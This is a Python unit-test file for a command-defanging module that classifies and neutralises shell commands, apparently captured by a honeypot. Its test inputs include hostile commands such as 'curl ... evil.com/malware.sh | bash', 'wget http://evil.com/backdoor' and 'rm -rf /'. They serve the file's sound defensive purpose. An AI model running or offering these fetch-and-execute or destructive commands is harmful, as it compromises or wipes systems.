"""Unit tests for command defanging functionality."""

from __future__ import annotations

import pytest

from cowrieprocessor.loader.defanging import (
    CommandDefanger,
    defang_url,
    get_command_risk_score,
    is_safe_command,
)


class TestCommandDefanger:
    """Test the CommandDefanger class functionality."""

    @pytest.fixture
    def defanger(self) -> CommandDefanger:
        """Create a CommandDefanger instance for testing."""
        return CommandDefanger()

    def test_analyze_safe_commands(self, defanger: CommandDefanger) -> None:
        """Test analysis of safe commands."""
        safe_commands = ["ls", "pwd", "whoami", "date", "echo hello", "cat file.txt"]

        for cmd in safe_commands:
            analysis = defanger.analyze_command(cmd)
            assert analysis["risk_level"] == "safe"
            assert analysis["needs_defanging"] is False
            assert analysis["defanging_strategy"] == "none"

    def test_analyze_moderate_commands(self, defanger: CommandDefanger) -> None:
        """Test analysis of moderate risk commands."""
        moderate_commands = ["mkdir test", "cp file.txt backup.txt", "ping google.com"]

        for cmd in moderate_commands:
            analysis = defanger.analyze_command(cmd)
            assert analysis["risk_level"] == "moderate"
            assert analysis["needs_defanging"] is True
            assert analysis["defanging_strategy"] == "moderate"

    def test_analyze_dangerous_commands(self, defanger: CommandDefanger) -> None:
        """Test analysis of dangerous commands."""
        dangerous_commands = [
            "rm -rf /",
            "bash script.sh",
            "curl http://evil.com/malware",
            "python -c 'import os; os.system(\"rm -rf /\")'",
        ]

        for cmd in dangerous_commands:
            analysis = defanger.analyze_command(cmd)
            assert analysis["risk_level"] == "dangerous"
            assert analysis["needs_defanging"] is True
            assert analysis["defanging_strategy"] == "aggressive"

    def test_defang_urls(self, defanger: CommandDefanger) -> None:
        """Test URL defanging."""
        test_cases = [
            ("https://evil.com/malware", "hxxps://evil.com/malware"),
            ("http://example.com", "hxxp://example.com"),
            ("ftp://files.com/data", "fxp://files.com/data"),
            ("ftps://secure.com", "fxps://secure.com"),
        ]

        for original, expected in test_cases:
            result = defanger.defang_command(original)
            assert expected in result

    def test_defang_dangerous_patterns(self, defanger: CommandDefanger) -> None:
        """Test defanging of dangerous command patterns."""
        test_cases = [
            ("cmd1 && cmd2", "cmd1 [AND] cmd2"),
            ("cmd1 || cmd2", "cmd1 [OR] cmd2"),
            ("cmd1 | cmd2", "cmd1 [PIPE] cmd2"),
            ("cmd1; cmd2", "cmd1[SC] cmd2"),
            ("echo `whoami`", "echo [BACKTICK] whoami [BACKTICK]"),
            ("echo $(date)", "echo [SUBSHELL] date [SUBSHELL]"),
            ("cmd < file", "cxd < file"),
            ("cmd >> file", "cxd [APPEND] file"),
            ("cmd > file", "cxd [OUTPUT] file"),
            ("cmd 2>&1", "cxd 2[OUTPUT]&1"),
        ]

        for original, expected_pattern in test_cases:
            result = defanger.defang_command(original)
            assert expected_pattern in result

    def test_defang_command_names(self, defanger: CommandDefanger) -> None:
        """Test defanging of dangerous command names."""
        test_cases = [
            ("bash script.sh", "bxsh script.sh"),
            ("python malware.py", "pythxn malware.py"),
            ("curl http://evil.com", "cxrl hxxp://evil.com"),
            ("rm -rf /", "rx -rf /"),
            ("powershell script.ps1", "pxwershell script.ps1"),
        ]

        for original, expected_pattern in test_cases:
            result = defanger.defang_command(original, "aggressive")
            assert expected_pattern in result

    def test_create_safe_command(self, defanger: CommandDefanger) -> None:
        """Test creation of safe command versions."""
        test_cases = [
            ("ls -la", "ls -la"),  # Safe command unchanged
            ("curl http://evil.com", "[defang:dangerous] cxrl hxxp://evil.com"),
            ("mkdir test", "[defang:moderate] mkdir test"),
        ]

        for original, expected_pattern in test_cases:
            result = defanger.create_safe_command(original)
            assert expected_pattern in result

    def test_extract_command_components(self, defanger: CommandDefanger) -> None:
        """Test extraction of command components."""
        cmd = "curl -L -o malware.sh https://evil.com/script.sh"
        components = defanger.extract_command_components(cmd)

        assert components["base_command"] == "curl"
        assert "-L" in components["flags"]
        assert "-o" in components["flags"]
        assert "malware.sh" in components["arguments"]
        assert "https://evil.com/script.sh" in components["paths"]
        assert "https://" in components["urls"]

    def test_empty_command_handling(self, defanger: CommandDefanger) -> None:
        """Test handling of empty or invalid commands."""
        test_cases = ["", None, "   ", "\n\t"]

        for cmd in test_cases:
            analysis = defanger.analyze_command(cmd)
            assert analysis["risk_level"] == "safe"
            assert analysis["needs_defanging"] is False

            result = defanger.defang_command(cmd)
            assert result == cmd or result == ""


class TestUtilityFunctions:
    """Test utility functions for command defanging."""

    def test_defang_url_function(self) -> None:
        """Test the standalone defang_url function."""
        test_cases = [
            ("https://example.com", "hxxps://example.com"),
            ("http://test.org", "hxxp://test.org"),
            ("ftp://files.net", "fxp://files.net"),
        ]

        for original, expected in test_cases:
            result = defang_url(original)
            assert expected in result

    def test_is_safe_command_function(self) -> None:
        """Test the is_safe_command function."""
        safe_commands = ["ls", "pwd", "whoami", "date", "echo hello"]
        unsafe_commands = ["rm -rf /", "bash script.sh", "curl http://evil.com"]

        for cmd in safe_commands:
            assert is_safe_command(cmd) is True

        for cmd in unsafe_commands:
            assert is_safe_command(cmd) is False

    def test_get_command_risk_score_function(self) -> None:
        """Test the get_command_risk_score function."""
        test_cases = [
            ("ls -la", 0),  # Safe command
            ("mkdir test", 30),  # Moderate command
            ("rm -rf /", 70),  # Dangerous command
            ("curl http://evil.com && bash", 90),  # Dangerous with patterns
        ]

        for cmd, expected_min_score in test_cases:
            score = get_command_risk_score(cmd)
            assert score >= expected_min_score
            assert score <= 100

    def test_edge_cases(self) -> None:
        """Test edge cases and error handling."""
        # Empty or None inputs
        assert defang_url("") == ""
        assert defang_url(None) is None
        assert is_safe_command("") is True
        assert is_safe_command(None) is True
        assert get_command_risk_score("") == 0
        assert get_command_risk_score(None) == 0


class TestDefangingIntegration:
    """Integration tests for defanging with real-world scenarios."""

    @pytest.fixture
    def defanger(self) -> CommandDefanger:
        """Create a CommandDefanger instance for testing."""
        return CommandDefanger()

    def test_malware_download_scenario(self, defanger: CommandDefanger) -> None:
        """Test defanging of typical malware download commands."""
        malicious_cmd = "curl -s https://evil.com/malware.sh | bash"

        analysis = defanger.analyze_command(malicious_cmd)
        assert analysis["risk_level"] == "dangerous"

        safe_version = defanger.create_safe_command(malicious_cmd)
        assert "[defang:dangerous]" in safe_version
        assert "hxxps://" in safe_version
        assert "[PIPE]" in safe_version
        assert "bxsh" in safe_version

    def test_file_manipulation_scenario(self, defanger: CommandDefanger) -> None:
        """Test defanging of file manipulation commands."""
        file_cmd = "rm -rf /tmp/malware && wget http://evil.com/backdoor"

        analysis = defanger.analyze_command(file_cmd)
        assert analysis["risk_level"] == "dangerous"

        safe_version = defanger.create_safe_command(file_cmd)
        assert "[defang:dangerous]" in safe_version
        assert "rx" in safe_version
        assert "[AND]" in safe_version
        assert "hxxp://" in safe_version

    def test_system_reconnaissance_scenario(self, defanger: CommandDefanger) -> None:
        """Test defanging of reconnaissance commands."""
        recon_cmd = "whoami && id && uname -a && ps aux"

        analysis = defanger.analyze_command(recon_cmd)
        # This should be moderate risk due to chaining
        assert analysis["risk_level"] in ["moderate", "dangerous"]

        safe_version = defanger.create_safe_command(recon_cmd)
        assert "[AND]" in safe_version

    def test_safe_commands_preserved(self, defanger: CommandDefanger) -> None:
        """Test that safe commands are preserved without defanging."""
        safe_commands = [
            "ls -la /home/user",
            "cat /etc/passwd",
            "ps aux | grep python",
            "find /var/log -name '*.log'",
        ]

        for cmd in safe_commands:
            analysis = defanger.analyze_command(cmd)
            if analysis["risk_level"] == "safe":
                safe_version = defanger.create_safe_command(cmd)
                assert safe_version == cmd
                assert "[defang:" not in safe_version

    def test_complex_malicious_command(self, defanger: CommandDefanger) -> None:
        """Test defanging of complex malicious commands."""
        complex_cmd = """
        curl -s https://evil.com/payload.sh | bash -c 'wget http://backup.com/malware && 
        python -c "import os; os.system('rm -rf /tmp/*')" && 
        echo "done" > /tmp/status'
        """.strip()

        analysis = defanger.analyze_command(complex_cmd)
        assert analysis["risk_level"] == "dangerous"

        safe_version = defanger.create_safe_command(complex_cmd)
        assert "[defang:dangerous]" in safe_version

        # Check that dangerous elements are defanged
        assert "hxxps://" in safe_version
        assert "hxxp://" in safe_version
        assert "[PIPE]" in safe_version
        assert "bxsh" in safe_version
        assert "wget" in safe_version  # wget is inside quotes so not defanged
        assert "pythxn" in safe_version
